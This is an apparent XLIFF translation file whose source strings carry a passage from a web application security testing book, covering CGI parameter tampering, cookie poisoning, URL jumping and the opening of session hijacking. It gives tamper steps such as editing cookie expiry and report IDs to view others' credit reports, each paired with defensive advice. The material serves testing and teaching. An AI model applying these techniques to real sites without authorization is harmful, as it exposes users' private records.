          <source>&lt;sup&gt;&lt;a name="ch04fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; We might also want to inject SQL statements or script tags to perform SQL injection and cross-site scripting attacks. Those topics will be discussed in later chapters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This effectively asks the database for a different record than the one originally requested. Perhaps this is not a severe security risk in most circumstances, but imagine if the request was for a patient's record in a healthcare provider's online system. You've just breached the patient's privacy in the worst sort of way. This is exactly the situation we are trying to prevent, so apply this attack in a creative way, and make sure these bugs are reported and fixed before your site goes live.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It helps to consider the common uses of CGI parameters, so let's spend some time talking about them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>CGI parameters are often used to pass user preferences. Take Google, for example. If you look at any Google search, you'll see the &lt;tt&gt;hl&lt;/tt&gt; parameter, which specifies what language to &amp;quot;brand&amp;quot; Google, as shown in &lt;a class="docLink" href="#ch04fig05"&gt;Figure 4-5&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-5. User preference parameters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What happens if that parameter is changed, say to &lt;tt&gt;'ru'&lt;/tt&gt;? In this case, Google changes its output to Russian. Changing the parameter to &lt;tt&gt;xx-hacker&lt;/tt&gt; results in &lt;a class="docLink" href="#ch04fig06"&gt;Figure 4-6&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-6. Modifying user preference parameters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another common use of CGI parameters is to keep track of which pages a user has navigated successfully. For example, some pages might be restricted to users who have been through a registration or authentication process. These parameters often have short names (single characters aren't uncommon) and can carry the values of 1 (true/on) or 0 (false/off). Modifying the value may fool the Web application into believing that the attacker has already registered.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because Web applications are notoriously difficult to debug (attaching a debugger and single stepping through code isn't easy), some developers add hidden debug parameters to their application. When these parameters are present, the developers send additional output to the browser, often giving a trace of internal application details such as database connections, SQL queries, and variable states.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In normal use, these parameters aren't present, so the end user is none the wiser. Adding &lt;tt&gt;&amp;amp;debug=on&lt;/tt&gt;, &lt;tt&gt;&amp;amp;debug=1&lt;/tt&gt;, or &lt;tt&gt;&amp;amp;debug=true&lt;/tt&gt; to the end of the list of CGI parameters (order of parameters generally isn't important, but commonly debug parameters are appended after existing ones) is a simple test to see if the developer has added this debug functionality. However, it's much easier to look at the application code to see if there are &lt;tt&gt;if (debug)...&lt;/tt&gt; statements. Say that instead of using simple Boolean values, the developer uses a &amp;quot;magic&amp;quot; number, like 3141592654, to turn debug mode on. Using manual, black-box testing, you may never discover this number&amp;mdash;looking at the source is much easier.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>So far, we've talked about CGI parameters passed in the browser's address bar, which are known as &lt;tt&gt;GET&lt;/tt&gt; parameters. We also mentioned &lt;tt&gt;POST&lt;/tt&gt; parameters, which you'll be learning more about in the upcoming sidebar titled &amp;quot;&lt;a class="docLink" href="#ch04sb01"&gt;The Difference Between &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; Parameters&lt;/a&gt;.&amp;quot; &lt;tt&gt;POST&lt;/tt&gt; parameters are not as obvious to the end user, or as easy to change, &lt;tt&gt;and&lt;/tt&gt; are passed to the Web server in a slightly different way than &lt;tt&gt;GET&lt;/tt&gt; parameters. This means that we cannot as easily modify them using techniques we have introduced thus far; we must use something to help us. Enter Paros Proxy 0, the authors' favorite Web testing tool.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Paros is described more fully in &lt;a class="docLink" href="app03.html#app03"&gt;Appendix C&lt;/a&gt;, &amp;quot;Tools,&amp;quot; but it allows you to see and modify all HTTP traffic to and from the Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Numerous types of data are passed using CGI parameters. CGI is one of the &lt;span class="docEmphasis"&gt;only&lt;/span&gt; mechanisms of passing data to subsequently loaded pages. Therefore, a comprehensive list of attacks is impossible, and testers need to carefully consider how each parameter may be misused. CGI parameters are the delivery vector for most other attacks (cross-site scripting, SQL injection, directory traversal, and so on) that we will be discussing. That's why knowing what parameters there are and how to change them is important.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps the best advice to defend against this attack and many other attacks that originate on the client machine is to parse all input for validity. (You may want to refer to the sidebar &amp;quot;&lt;a class="docLink" href="ch03lev1sec2.html#ch03sb01"&gt;Validating Input&lt;/a&gt;&amp;quot; in the previous chapter for an in-depth discussion.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>The Difference Between &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; Parameters</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Generally, the parameters you'll see passed to a Web server are &lt;tt&gt;GET&lt;/tt&gt; parameters&amp;mdash;those you can see on the address bar. However, there's another method of passing parameters known as &lt;tt&gt;POST&lt;/tt&gt;. Unless client-side code (JavaScript, applets, and so on) generates &lt;tt&gt;POST&lt;/tt&gt; requests, these requests are only sent via forms. (If you look at the &lt;tt&gt;&amp;lt;form&amp;gt;&lt;/tt&gt; tag, you'll often see an &lt;tt&gt;action="post"&lt;/tt&gt; attribute.) But before we go into the difference between the two parameter-passing mechanisms, let's address why there are two ways to accomplish the same thing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The HTML specification gives the usage advice that &lt;tt&gt;GET&lt;/tt&gt; requests are &lt;span class="docEmphStrong"&gt;&lt;tt&gt;idempotent&lt;/tt&gt;&lt;/span&gt; operations (basically just receiving information&amp;mdash;thus &amp;quot;&lt;tt&gt;GET&lt;/tt&gt;&amp;quot;), and &lt;tt&gt;POST&lt;/tt&gt; operations should be for anything else that may involve some state change in the application, such as updating a database, sending e-mail, or ordering a product. There might be other reasons for using &lt;tt&gt;POST&lt;/tt&gt; over &lt;tt&gt;GET&lt;/tt&gt;, such as when sending large quantities of data, because some Web servers do not like receiving more than 8KB in the URL, but 1KB is a more realistic limit. However, the reason for this distinction is that the browser should not resend a &lt;tt&gt;POST&lt;/tt&gt; request (for example, if the user clicks the Back button, resubmits a form, or reloads a page) without informing the user first. Just imagine that you're ordering a product, there's a delay, and you click the Order button once more&amp;mdash;have you just submitted two orders or one? Some other significant differences exist, but we discuss them in later attacks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>There's also a technical difference between &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; values. Whereas &lt;tt&gt;GET&lt;/tt&gt; parameters are passed with the URL, &lt;tt&gt;POST&lt;/tt&gt; parameters are sent as part of the body of the request (that is, not in the HTTP Headers section&amp;mdash;see &lt;a class="docLink" href="#ch04fig07"&gt;Figure 4-7&lt;/a&gt;). Also, the byte count of the parameters plus all data is calculated and passed in the &lt;tt&gt;content-length&lt;/tt&gt; HTTP header. Although most Web servers are lenient about mismatches between the specified size and actual size of &lt;tt&gt;POST&lt;/tt&gt; parameters, lazy attackers don't update the &lt;tt&gt;content-length&lt;/tt&gt;. That's why this is sometimes a good way to determine if the request has been significantly tampered with.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.center.h5.text">
          <source>Figure 4-7. Paros proxy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.h4.text">
          <source>Attack 8 Cookie Poisoning</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Cookies&lt;/span&gt; are small files of textual data that a Web application writes on a client's hard drive. The Web application can then reuse this data on subsequent visits to the site from that same computer. This allows the Web site to remember a visitor and offer him customized or personalized content based on the information stored in the cookie.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>When people talk about &lt;span class="docEmphStrong"&gt;cookie poisoning&lt;/span&gt;, it's mostly in the context of session hijacking (another attack described later in this chapter). However, there's much more to cookies than just session identifiers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Cookies are delivered in four forms that are the combination of two settings: persistent or nonpersistent, and secure or nonsecure. The browser</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>places persistent cookies on the client hard disk until their expiry date. In contrast, the browser destroys nonpersistent cookies (which are stored only in memory) as soon as it closes. The secure setting for a cookie, though, is a bit misleading. The cookie itself is not secured or encrypted in any way, but it is a directive to the browser to send this cookie &lt;span class="docEmphasis"&gt;only&lt;/span&gt; over secure transport, which is HTTP over SSL (HTTPS).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Although the data within a cookie is an obvious place to attack, cookies also have the ability to expire after a specified date. This functionality often ensures that users reidentify themselves after a period of time or sets some time limit on accessing a resource. For example, a credit report might be valid for only 30 days.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Like it or loathe it, users are deluged with cookies whenever they use the Web. You can set up all browsers to warn users when a cookie is written to their hard drive, but software like CookiePal (&lt;a class="docLink" target="_blank" href="http://www.kburra.com/cpal.html"&gt;http://www.kburra.com/cpal.html&lt;/a&gt;) or CookieCrusher (&lt;a class="docLink" target="_blank" href="http://www.thelimitsoft.com/cookie/"&gt;http://www.thelimitsoft.com/cookie/&lt;/a&gt;) gives users more fine-grain control over what cookies they accept or reject and how they view the cookies they have on their computer. Firefox has a lot of this functionality built in.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Cookies are stored in predefined locations, with predefined formats, so modifying their data manually is easy. In Firefox/Netscape, cookies are stored in a &lt;tt&gt;cookies.txt&lt;/tt&gt; file with a format shown in &lt;a class="docLink" href="#ch04fig08"&gt;Figure 4-8&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-8. Netscape cookie format.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Internet Explorer stores its cookies in c:/documents and setting/%USERNAME%/cookies/ as individual text files in a format that needs some explanation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Each text file in the &lt;tt&gt;cookies&lt;/tt&gt; directory is formatted as &lt;tt&gt;username@sitename[1].txt&lt;/tt&gt;. Therefore, if Joe visited &lt;a class="docLink" target="_blank" href="http://Amazon.com"&gt;Amazon.com&lt;/a&gt;, all his cookies for that site would be stored in the file &lt;tt&gt;joe@amazon[1].txt&lt;/tt&gt;, and on rare occasions, the file would have the &lt;tt&gt;[2]&lt;/tt&gt; postfix. Cookies inside the file are separated by &lt;tt&gt;*&lt;/tt&gt; on a single line, with the cookies formatted as shown in &lt;a class="docLink" href="#ch04fig09"&gt;Figure 4-9&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-9. Internet Explorer cookie format.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>What's interesting about this cookie format is not the name, value, or domain attributes, but the way the time and dates are stored.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Rather than storing the creation and expiry timestamps as the number of seconds past midnight January 1, 1970 (the most common format), Internet Explorer uses increments of 100 nanoseconds (10&lt;sup&gt;-7&lt;/sup&gt; seconds) since January 1, 1601. Why Microsoft had to use such a fine-grained scale or go back as far as the 1600s is beyond us, but it fits nicely into a 64-bit number. When you're saving cookies, however, this 64-bit value is broken into two sections: time and date. Although the numbers seem difficult to interpret, it's possible to deduce the date and time from them. The bottom number of the pair is the most significant because it shows time and date in units of 429.4967296 seconds since January 1, 1601. The top number shows the time since the last unit of 429.4967296 seconds has passed, in units of 10&lt;sup&gt;-7&lt;/sup&gt; seconds.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>For example, suppose that we check our credit rating with a fictitious site, &lt;a class="docLink" target="_blank" href="http://Simplecreditrating.com"&gt;Simplecreditrating.com&lt;/a&gt;. We are given our credit rating report online, but it expires in 30 days. &lt;a class="docLink" target="_blank" href="http://Simplecreditrating.com"&gt;Simplecreditrating.com&lt;/a&gt; enforces this policy by issuing a cookie with the report ID that expires in a month. We can find the cookie here:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.div.pre.text">
          <source>c:/documents and settings/mike/cookies/mike@
 simplecreditreport[1].txt</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Now we can open the cookie in WordPad, as shown in &lt;a class="docLink" href="#ch04fig10"&gt;Figure 4-10&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-10. Cookie for a sample credit report application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>If we change the &lt;tt&gt;29592292&lt;/tt&gt; value to &lt;tt&gt;29598326&lt;/tt&gt;, we can access the report for an extra 30 days. The designer of this Web site probably didn't intend for us to do that.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>It's not only the expiry timestamp of a cookie that we can change. We can also change the value part of the cookie. We can change the report reference number, &lt;tt&gt;11223344&lt;/tt&gt;, to another value in an attempt to read someone else's credit report.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Some Web applications have a &amp;quot;remember me&amp;quot; functionality, where return visitors are automatically logged in or presented with custom content. Because cookies are the only way to store state information on the client across sessions, this is the obvious place to look to try to break this kind of functionality. Viewing cookies when this functionality is available can reveal usernames and passwords, or &amp;quot;magic&amp;quot; identifiers that are supplied to the Web server in lieu of a user having to authenticate. All of these are attractive targets for attackers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>In Attack 11, we'll look at a related method whereby an attacker can steal cookies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Designers of the Web never intended cookies to be secure. Cookies were to be an extension to HTTP that gave it some aspect of client-side state. However, because cookie files are the &lt;span class="docEmphasis"&gt;only&lt;/span&gt; way to store state information across browser sessions, Web designers have used them considerably and will likely continue to use them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>If your Web application is relying on cookies to enforce expiration or you really have to store sensitive data on the client, consider encrypting the cookie. And don't rely on the cookie's own expiry date, because that's easy to tamper with.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.h4.text">
          <source>Attack 9 URL Jumping</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Because the Web is inherently stateless, users can jump to any page they want to by typing the Universal Resource Locator (URL) in the browser's address bar and pressing Enter. Developers of Web applications often don't want to allow users this level of freedom because they might have a sequence of operations that users have to follow, as depicted in &lt;a class="docLink" href="#ch04fig11"&gt;Figure 4-11&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-11. Common flow of functionality in an e-commerce application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>If the user were allowed to jump directly from the Checkout page to the Delivery Info page, he may be able to receive his goods without paying for them. This is only one such example. There are many occasions in a system where one operation has to take place before another (for example, logging in before reading an e-mail message, or selecting a group before posting a forum message). The purpose of this attack is to identify actions in a Web application that should be sequenced and attempt to jump into, around, or over certain steps by browsing directly to them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>This attack often requires some understanding of the Web application and exactly what it implements. You may want to go back to the page map we developed in &lt;a class="docLink" href="ch02.html#ch02"&gt;Chapter 2&lt;/a&gt;, &amp;quot;Gathering Information on the Target,&amp;quot; and think about sequences of pages or operations and the implications of jumping from page to page without clicking the links that the application provides.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Begin by browsing the application as a legitimate, well-behaved user, and note the addresses of pages visited along with their sequence. Using this list, randomly enter addresses and see if the application produces meaningful error messages or disallows access to specific pages.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>For a poorly developed Web application, this attack is a task of reconnaissance followed by entering page addresses into the browser's address bar. However, good Web developers understand the problem of users breaking out of page sequences. As one means of protection against this attack, these developers may compare the last visited page against the one a user &lt;span class="docEmphasis"&gt;should&lt;/span&gt; have come from.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Developers can achieve this protection technique with any of the following methods:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Using hidden fields or CGI parameters to store a page address or identifier</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Using cookies to store last visited pages or identifiers</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Comparing where the user should have come from with the HTTP-REFERER field</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The first method, using hidden fields or CGI parameters with page addresses, is the most insecure method because it is subject to the attacks described earlier. It really only stops unsophisticated attackers; nonetheless, developers use the technique because of the simplicity of including the hidden data at design time. It's relatively easy to change the field's value or even to add a required hidden field where necessary (in either the HTML source or by capturing the page request using a proxy).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The second method, using cookies to store the last visited page, is slightly more secure because cookies (especially temporary ones&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch04fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt;) are harder to modify as they are passed in the HTTP header&amp;mdash;a place that users can't control through the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch04fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; Temporary cookies are ones that expire when the browser closes. Generally, they are only stored in memory, not on the hard drive where they are easier to locate and edit. But don't get the idea that temporary cookies are secure. They aren't. However, they do require a more sophisticated attacker who has more advanced debugging tools.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.caption.h5.text">
          <source>Figure 4-12. Request for a page. Note the referer header.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.p.div.pre.text">
          <source>GET /articles/news/today.asp HTTP/1.1
Accept: */*
Accept-Language: en-us
Connection: Keep-Alive
Host: localhost
Referer: http://www.myhomepage.com/links.asp
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT
 5.0)
Accept-Encoding: gzip, deflate</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.caption.h5.text">
          <source>Figure 4-13. The associated response. Note the server setting a cookie value.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.p.div.pre.text">
          <source>HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
Date: Thu, 13 Jul 2000 05:46:53 GMT
Content-Length: 2291
Content-Type: text/html
Set-Cookie: chocolatechip=DR2EO53DNSK2EMM5K2LSLJ5NEKE;
 path=/
Cache-control: private

&amp;lt;HTML&amp;gt;
[...html markup follows...]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Also note that in the HTTP request data, the referer field carries the address of the page that initiated the request and may be used instead of setting an explicit cookie.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>In fact, it's pretty easy to change the HTTP header. In modifying the referer header and the cookie, you can use proxy tools such as Paros to change the cookie's or the referer's value. You can also perform page requests manually, as we will show in future attacks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Regardless of which method the Web developer chooses to implement or how you decide to attack it, the principle is the same: Request a page that a user should not be able to jump directly to, and see if you can view it. If not, modify the values of hidden fields, cookies, or the referer to try to force it the hard way. If you see the page, you have a potential attack scenario and a bug report to write.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>There is no other way to protect against this attack except by restricting the sequence in which you can view pages. This obviously requires storing the last visited page, but as mentioned earlier, you can store this information in numerous places, some of which an attacker can access.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The most secure place for the last visited page to be stored is on the server, because users only have control over information on the client machine and the information that the browser sends over the network. Many Web application servers can store variables on the server (ColdFusion, Java Servlets, ASP, PHP, and so on), but this requires the use of session variables and opens up the possibility of session hijacking attacks, covered later in this chapter.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>If there is one preferred method of storing the last visited page (without server-side support), it would be in the HTTP-REFERER field. That field is not more secure than the others, but when a Web application sends cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>to the user's browser, it's a signal that something interesting is being stored,&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch04fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; as shown in &lt;a class="docLink" href="#ch04fig12"&gt;Figure 4-14&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch04fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; By default, Internet Explorer is set to allow all cookies. To change this functionality, go to Tools, Internet Options. Click on the Privacy tab, and then select Advanced.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-14. Cookie warning in Internet Explorer.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Utilizing the HTTP-REFERER is less likely to alert an attacker to its use because it is sent with every page request. Some proxies, however, may strip this information as a privacy precaution, so applications may not be able to rely on it. Manually typing a URL in the address bar also prevents it from being sent.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>To protect against the risk of users tampering with data that has to be stored on the client, consider encrypting the data with a well-known standard and restrict storing the encryption/decryption keys on the server. (Be extremely suspicious of roll-your-own cryptography. We talk about attacking crypto in &lt;a class="docLink" href="ch08.html#ch08"&gt;Chapter 8&lt;/a&gt;, &amp;quot;Authentication.&amp;quot;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.h4.text">
          <source>Attack 10 Session Hijacking</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Of all the state-based attacks that have been discussed thus far, session hijacking has the most exposure in the Web development literature. The reason for this is simple: You can use session management to solve a lot of the problems of storing state in a Web application. The issue is that if you do it incorrectly, it is open to attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Session management works by each user having a unique identifier that travels with him during his use of a Web site. This generally occurs with the server issuing a number to each new user on the initial home page of the site. All further requests would include this identifier so that Web applications can distinctly identify users and store their associated state information on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>You can use several methods to break session management by swapping the session identifier of one user with the session identifier of another user. The methods are as follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Modifying data randomly, hoping to become another user</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>Figuring out the sequence of unique identifiers that the site uses</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.text">
          <source>&amp;quot;Fixing&amp;quot; the session identifier of another user</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>Session identifiers are presented to the server as hidden fields, appended to URLs, or stored in cookies. Storing the session identifier in a cookie and then passing it to the server as each page is loaded is the most common. Session hijacking is the culmination of all the attacks that have been presented in this section.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>The most obvious way of identifying when to apply this attack is when you see a cookie sent to the browser. The cookie must contain some session identifier. A recent survey of Web sites showed that the following are the most common names for session cookies:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.tt.text">
          <source>ASPSESSIONID</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.tt.text">
          <source>JSESSIONID</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.tt.text">
          <source>PHPSESSID</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.tt.text">
          <source>CFID</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.ul.li.p.tt.text">
          <source>CFTOKEN</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
          <source>However, treat with suspicion any cookie that uses the moniker &amp;quot;ID&amp;quot; or looks like a unique number. When cookies are unavailable (some users disable them), you can append an identifier as a CGI parameter or insert it (munge it) into the page URL as &lt;a class="docLink" target="_blank" href="http://Amazon.com"&gt;Amazon.com&lt;/a&gt; does.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.center.h5.text">
          <source>Figure 4-15. Session ID munging when cookies are not available.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.table.tr.td.h5.text">
          <source>How to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.p.text">
